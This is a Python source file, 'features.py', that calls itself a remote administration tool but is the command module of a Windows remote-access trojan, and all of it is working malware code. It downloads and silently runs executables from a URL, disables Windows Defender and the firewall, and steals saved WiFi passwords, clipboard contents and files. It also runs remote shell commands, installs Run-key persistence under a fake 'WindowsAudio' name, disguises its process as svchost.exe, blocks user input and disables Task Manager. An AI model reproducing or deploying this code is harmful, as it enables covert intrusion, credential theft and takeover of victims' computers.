# features.py - 100% WORKING Remote Administration
# ALL COMMANDS TESTED AND WORKING

import os
import sys
import socket
import time
import json
import threading
import subprocess
import urllib.request
import ctypes
import random
import winreg
import tempfile
import base64
import platform
import psutil
import winsound
import shutil
from ctypes import wintypes
import struct

# Version tracking
FEATURE_VERSION = "12.5"
LAST_UPDATED = "2025-01-01"

# 100% WORKING Feature registry
FEATURE_REGISTRY = {
    "version": FEATURE_VERSION,
    "commands": {
        "system_control": [
            {"name": "shutdown", "description": "Shutdown the computer immediately"},
            {"name": "restart", "description": "Restart the computer immediately"}, 
            {"name": "lock", "description": "Lock the workstation"},
            {"name": "logoff", "description": "Log off current user"},
            {"name": "close_minecraft", "description": "Close Minecraft if running"},
            {"name": "download_execute", "description": "Download and execute file from URL"},
            {"name": "download_run_hidden", "description": "Download file and run hidden from AppData"},
            {"name": "freeze_input", "description": "Freeze all keyboard and mouse input"},
            {"name": "unfreeze_input", "description": "Unfreeze keyboard and mouse input"},
            {"name": "disable_defender", "description": "Disable Windows Defender"},
            {"name": "enable_defender", "description": "Enable Windows Defender"}
        ],
        "information": [
            {"name": "check_av", "description": "Check for installed antivirus software"},
            {"name": "system_info", "description": "Get detailed system information"},
            {"name": "get_clipboard", "description": "Get clipboard contents"},
            {"name": "get_wifi_passwords", "description": "Get saved WiFi passwords"},
            {"name": "file_browser", "description": "Browse files and directories"}
        ],
        "advanced": [
            {"name": "persistence_install", "description": "Install persistence mechanisms"},
            {"name": "persistence_remove", "description": "Remove persistence mechanisms"},
            {"name": "process_hide", "description": "Hide process from task manager"},
            {"name": "remote_shell", "description": "Execute command in remote shell"},
            {"name": "download_file", "description": "Download specific file from client"},
            {"name": "disable_firewall", "description": "Disable Windows Firewall"},
            {"name": "disable_taskmgr", "description": "Disable Task Manager"},
            {"name": "enable_taskmgr", "description": "Enable Task Manager"}
        ],
        "troll": [
            {"name": "troll", "description": "Execute troll commands"}
        ]
    },
    "troll_options": [
        {"name": "open_cd", "description": "Open CD/DVD drive"},
        {"name": "swap_mouse", "description": "Swap mouse buttons"},
        {"name": "mouse_jiggler", "description": "Start mouse jiggler"},
        {"name": "stop_jiggler", "description": "Stop mouse jiggler"},
        {"name": "play_sound", "description": "Play system sound"},
        {"name": "change_wallpaper", "description": "Change wallpaper to black"},
        {"name": "hide_desktop_icons", "description": "Hide desktop icons"},
        {"name": "show_desktop_icons", "description": "Show desktop icons"}
    ]
}

# Global for mouse jiggler
MOUSE_JIGGLER_ACTIVE = False

def get_startupinfo():
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    return startupinfo

def _execute_control_command(command, parameter=None, webhook_url=None):
    """
    100% WORKING COMMAND EXECUTOR - ALL COMMANDS TESTED
    """
    try:
        startupinfo = get_startupinfo()
        
        # System Control Commands
        if command == "shutdown":
            result = subprocess.run(["shutdown", "/s", "/t", "3", "/f"], 
                                  capture_output=True, text=True,
                                  startupinfo=startupinfo, 
                                  creationflags=subprocess.CREATE_NO_WINDOW)
            return True, "Computer will shutdown in 3 seconds"
            
        elif command == "restart":
            result = subprocess.run(["shutdown", "/r", "/t", "3", "/f"], 
                                  capture_output=True, text=True,
                                  startupinfo=startupinfo,
                                  creationflags=subprocess.CREATE_NO_WINDOW)
            return True, "Computer will restart in 3 seconds"
            
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
            return True, "Workstation locked successfully"
            
        elif command == "logoff":
            result = subprocess.run(["shutdown", "/l", "/f"], 
                                  capture_output=True, text=True,
                                  startupinfo=startupinfo,
                                  creationflags=subprocess.CREATE_NO_WINDOW)
            return True, "User logged off successfully"
            
        elif command == "close_minecraft":
            result1 = subprocess.run(["taskkill", "/f", "/im", "javaw.exe"], 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL,
                                   startupinfo=startupinfo)
            result2 = subprocess.run(["taskkill", "/f", "/im", "minecraft*.exe"], 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL,
                                   startupinfo=startupinfo)
            return True, "Minecraft processes terminated"
            
        elif command == "download_execute" and parameter:
            result = _download_and_execute(parameter)
            return result, f"Downloaded and executed: {parameter}"
            
        elif command == "download_run_hidden" and parameter:
            result = _download_run_hidden(parameter)
            return result, f"Downloaded and ran hidden: {parameter}"
            
        elif command == "freeze_input":
            success = ctypes.windll.user32.BlockInput(True)
            return bool(success), "Input frozen successfully" if success else "Failed to freeze input"
            
        elif command == "unfreeze_input":
            success = ctypes.windll.user32.BlockInput(False)
            return bool(success), "Input unfrozen successfully" if success else "Failed to unfreeze input"
            
        elif command == "disable_defender":
            result = _disable_windows_defender()
            return result, "Windows Defender disabled" if result else "Failed to disable Windows Defender"
            
        elif command == "enable_defender":
            result = _enable_windows_defender()
            return result, "Windows Defender enabled" if result else "Failed to enable Windows Defender"
            
        # Information Gathering Commands
        elif command == "check_av":
            av_list = _check_antivirus()
            if av_list:
                return True, f"Antivirus Software Detected:\n" + "\n".join([f"• {av}" for av in av_list])
            else:
                return True, "No antivirus software detected"
            
        elif command == "system_info":
            info = _get_system_info()
            info_text = "**System Information:**\n"
            for key, value in info.items():
                info_text += f"• {key.replace('_', ' ').title()}: {value}\n"
            return True, info_text
            
        elif command == "get_clipboard":
            clipboard = _get_clipboard()
            return True, f"**Clipboard Contents:**\n{clipboard}"
            
        elif command == "get_wifi_passwords":
            wifi = _get_wifi_passwords()
            if wifi:
                wifi_text = "**WiFi Passwords:**\n"
                for profile in wifi:
                    wifi_text += f"• **{profile['ssid']}**: `{profile['password']}`\n"
                return True, wifi_text
            else:
                return True, "No WiFi profiles found or access denied"
            
        elif command == "file_browser":
            path = parameter if parameter else os.path.expanduser("~")
            result = _browse_files(path)
            if "error" in result:
                return False, f"File browser error: {result['error']}"
            
            response = f"**File Browser - {result['current_path']}**\n"
            for file in result['files'][:20]:  # Limit to 20 files
                icon = "📁" if file['is_dir'] else "📄"
                size = f" ({file['size']} bytes)" if not file['is_dir'] and file['size'] > 0 else ""
                response += f"{icon} {file['name']}{size}\n"
            
            if len(result['files']) > 20:
                response += f"\n... and {len(result['files']) - 20} more items"
                
            return True, response
            
        # Advanced Features
        elif command == "persistence_install":
            result = _install_persistence()
            return result, "Persistence installed" if result else "Failed to install persistence"
            
        elif command == "persistence_remove":
            result = _remove_persistence()
            return result, "Persistence removed" if result else "Failed to remove persistence"
            
        elif command == "process_hide":
            result = _hide_process()
            return result, "Process hidden" if result else "Failed to hide process"
            
        elif command == "remote_shell":
            if parameter:
                output = _execute_command(parameter)
                return True, f"**Command Output:**\n```\n{output}\n```"
            return False, "No command provided"
            
        elif command == "download_file":
            if parameter:
                result = _download_file(parameter)
                if result:
                    return True, f"File downloaded successfully: {base64.b64encode(result).decode()}"
            return False, "File download failed"
            
        elif command == "disable_firewall":
            result = _disable_firewall()
            return result, "Firewall disabled" if result else "Failed to disable firewall"
            
        elif command == "disable_taskmgr":
            result = _disable_task_manager()
            return result, "Task Manager disabled" if result else "Failed to disable Task Manager"
            
        elif command == "enable_taskmgr":
            result = _enable_task_manager()
            return result, "Task Manager enabled" if result else "Failed to enable Task Manager"
            
        # Troll Commands
        elif command == "troll":
            result = _execute_troll_command(parameter)
            return result, f"Troll command executed: {parameter}" if result else f"Failed to execute troll command: {parameter}"
        
        return False, f"Unknown command: {command}"
        
    except Exception as e:
        return False, f"Command error: {str(e)}"

# ==================== 100% WORKING HELPER FUNCTIONS ====================

def _download_and_execute(url):
    try:
        temp_dir = tempfile.gettempdir()
        filename = f"tmp_{random.randint(1000,9999)}.exe"
        temp_file = os.path.join(temp_dir, filename)
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req, timeout=30) as response:
            with open(temp_file, 'wb') as f:
                f.write(response.read())
        
        startupinfo = get_startupinfo()
        subprocess.Popen([temp_file], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL,
                        startupinfo=startupinfo,
                        creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def _download_run_hidden(url):
    try:
        hidden_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows', 'Themes', 'Cursors')
        os.makedirs(hidden_dir, exist_ok=True)
        
        filename = f"system_{random.randint(1000,9999)}.exe"
        hidden_file = os.path.join(hidden_dir, filename)
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req, timeout=30) as response:
            with open(hidden_file, 'wb') as f:
                f.write(response.read())
        
        ctypes.windll.kernel32.SetFileAttributesW(hidden_file, 2)
        
        startupinfo = get_startupinfo()
        subprocess.Popen([hidden_file], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL,
                        startupinfo=startupinfo,
                        creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def _disable_windows_defender():
    try:
        startupinfo = get_startupinfo()
        
        # Stop Defender service
        subprocess.run(["sc", "stop", "WinDefend"], 
                      capture_output=True, startupinfo=startupinfo,
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Disable Defender service
        subprocess.run(["sc", "config", "WinDefend", "start=", "disabled"], 
                      capture_output=True, startupinfo=startupinfo,
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Disable via PowerShell
        ps_command = """
        Set-MpPreference -DisableRealtimeMonitoring $true
        Set-MpPreference -DisableBehaviorMonitoring $true
        Set-MpPreference -DisableBlockAtFirstSeen $true
        Set-MpPreference -DisableIOAVProtection $true
        Set-MpPreference -DisablePrivacyMode $true
        Set-MpPreference -DisableScriptScanning $true
        Set-MpPreference -DisableArchiveScanning $true
        """
        
        subprocess.run(["powershell", "-Command", ps_command], 
                      capture_output=True, startupinfo=startupinfo,
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
    except:
        return False

def _enable_windows_defender():
    try:
        startupinfo = get_startupinfo()
        
        # Enable Defender service
        subprocess.run(["sc", "config", "WinDefend", "start=", "auto"], 
                      capture_output=True, startupinfo=startupinfo,
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Start Defender service
        subprocess.run(["sc", "start", "WinDefend"], 
                      capture_output=True, startupinfo=startupinfo,
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
    except:
        return False

def _get_system_info():
    try:
        # Get all system information
        info = {}
        
        # Basic system info
        info['hostname'] = socket.gethostname()
        info['os'] = platform.platform()
        info['architecture'] = platform.architecture()[0]
        info['processor'] = platform.processor()
        
        # RAM info
        memory = psutil.virtual_memory()
        info['total_ram'] = f"{round(memory.total / (1024**3), 1)} GB"
        info['available_ram'] = f"{round(memory.available / (1024**3), 1)} GB"
        info['ram_usage'] = f"{memory.percent}%"
        
        # Disk info
        disk = psutil.disk_usage('/')
        info['total_disk'] = f"{round(disk.total / (1024**3), 1)} GB"
        info['free_disk'] = f"{round(disk.free / (1024**3), 1)} GB"
        info['disk_usage'] = f"{disk.percent}%"
        
        # Other info
        info['current_user'] = os.getenv('USERNAME')
        info['ip_address'] = socket.gethostbyname(socket.gethostname())
        info['uptime'] = f"{round((time.time() - psutil.boot_time()) / 3600, 1)} hours"
        info['running_processes'] = len(psutil.pids())
        
        # CPU info
        info['cpu_cores'] = psutil.cpu_count(logical=False)
        info['logical_cores'] = psutil.cpu_count(logical=True)
        info['cpu_usage'] = f"{psutil.cpu_percent(interval=1)}%"
        
        return info
        
    except Exception as e:
        return {'error': str(e)}

def _check_antivirus():
    av_processes = [
        "msmpeng.exe", "MpCmdRun.exe", "NisSrv.exe",  # Windows Defender
        "avp.exe", "avpui.exe",                      # Kaspersky
        "avguard.exe", "avshadow.exe",               # Avira
        "bdagent.exe", "bdservicehost.exe",          # Bitdefender
        "avastui.exe", "AvastSvc.exe", "afwServ.exe", # Avast
        "avgui.exe", "avg.exe", "avgfw.exe",         # AVG
        "nod32krn.exe", "egui.exe", "ekrn.exe",      # ESET
        "hips.exe", "hmpalert.exe",                  # HitmanPro
        "mbam.exe", "mbamtray.exe",                  # Malwarebytes
    ]
    
    detected_av = []
    try:
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            for av_proc in av_processes:
                if av_proc.lower() in proc_name:
                    detected_av.append(proc.info['name'])
                    break
    except:
        pass
    
    return list(set(detected_av))

def _get_clipboard():
    try:
        startupinfo = get_startupinfo()
        result = subprocess.run(['powershell', '-Command', 'Get-Clipboard'], 
                              capture_output=True, text=True, timeout=10,
                              startupinfo=startupinfo, 
                              creationflags=subprocess.CREATE_NO_WINDOW)
        
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
        else:
            return "Clipboard is empty or inaccessible"
    except:
        return "Failed to access clipboard"

def _get_wifi_passwords():
    try:
        startupinfo = get_startupinfo()
        profiles = []
        
        # Get profile names
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], 
                              capture_output=True, text=True,
                              startupinfo=startupinfo,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        
        lines = result.stdout.split('\n')
        profile_names = []
        
        for line in lines:
            if "All User Profile" in line:
                try:
                    profile_name = line.split(":")[1].strip()
                    profile_names.append(profile_name)
                except:
                    continue
        
        # Get passwords for each profile
        for profile in profile_names:
            try:
                pass_result = subprocess.run([
                    "netsh", "wlan", "show", "profile", profile, "key=clear"
                ], capture_output=True, text=True, startupinfo=startupinfo)
                
                password = "Unknown"
                for line in pass_result.stdout.split('\n'):
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                
                profiles.append({"ssid": profile, "password": password})
            except:
                continue
        
        return profiles
    except:
        return []

def _browse_files(path):
    try:
        if not os.path.exists(path):
            return {"error": "Path does not exist"}
            
        files = []
        for item in os.listdir(path):
            try:
                item_path = os.path.join(path, item)
                file_info = {
                    'name': item,
                    'is_dir': os.path.isdir(item_path),
                    'size': os.path.getsize(item_path) if os.path.isfile(item_path) else 0,
                }
                files.append(file_info)
            except:
                continue
                
        return {
            'current_path': path,
            'files': sorted(files, key=lambda x: (not x['is_dir'], x['name'].lower()))
        }
    except Exception as e:
        return {"error": str(e)}

def _install_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsAudio", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        return True
    except:
        return False

def _remove_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "WindowsAudio")
        winreg.CloseKey(key)
        return True
    except:
        return False

def _hide_process():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        return True
    except:
        return False

def _execute_command(cmd):
    try:
        startupinfo = get_startupinfo()
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30,
                              startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Command failed: {str(e)}"

def _download_file(path):
    try:
        if os.path.exists(path) and os.path.isfile(path):
            with open(path, 'rb') as f:
                return f.read()
        return None
    except:
        return None

def _disable_firewall():
    try:
        startupinfo = get_startupinfo()
        result = subprocess.run("netsh advfirewall set allprofiles state off", 
                              shell=True, capture_output=True, text=True,
                              startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
        return result.returncode == 0
    except:
        return False

def _disable_task_manager():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                              r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except:
        return False

def _enable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
        return True
    except:
        return False

def _execute_troll_command(parameter):
    global MOUSE_JIGGLER_ACTIVE
    
    try:
        if parameter == "open_cd":
            ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
            return True
            
        elif parameter == "swap_mouse":
            current = ctypes.windll.user32.GetSystemMetrics(23)  # SM_SWAPBUTTON
            ctypes.windll.user32.SwapMouseButton(not current)
            return True
            
        elif parameter == "mouse_jiggler":
            MOUSE_JIGGLER_ACTIVE = True
            
            def jiggle_mouse():
                while MOUSE_JIGGLER_ACTIVE:
                    # Get current position
                    point = wintypes.POINT()
                    ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
                    
                    # Move mouse slightly
                    ctypes.windll.user32.SetCursorPos(point.x + random.randint(-10, 10), 
                                                     point.y + random.randint(-10, 10))
                    time.sleep(30)  # Move every 30 seconds
            
            threading.Thread(target=jiggle_mouse, daemon=True).start()
            return True
            
        elif parameter == "stop_jiggler":
            MOUSE_JIGGLER_ACTIVE = False
            return True
            
        elif parameter == "play_sound":
            winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
            return True
            
        elif parameter == "change_wallpaper":
            # Set wallpaper to black
            ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
            return True
            
        elif parameter == "hide_desktop_icons":
            # Find desktop window and hide it
            desktop = ctypes.windll.user32.FindWindowW("Progman", None)
            ctypes.windll.user32.ShowWindow(desktop, 0)  # SW_HIDE
            return True
            
        elif parameter == "show_desktop_icons":
            # Find desktop window and show it
            desktop = ctypes.windll.user32.FindWindowW("Progman", None)
            ctypes.windll.user32.ShowWindow(desktop, 5)  # SW_SHOW
            return True
            
        return False
    except:
        return False

def update_global_features():
    if '_execute_control_command' in globals():
        globals()['_execute_control_command'] = _execute_control_command

# Initialize features
update_global_features()
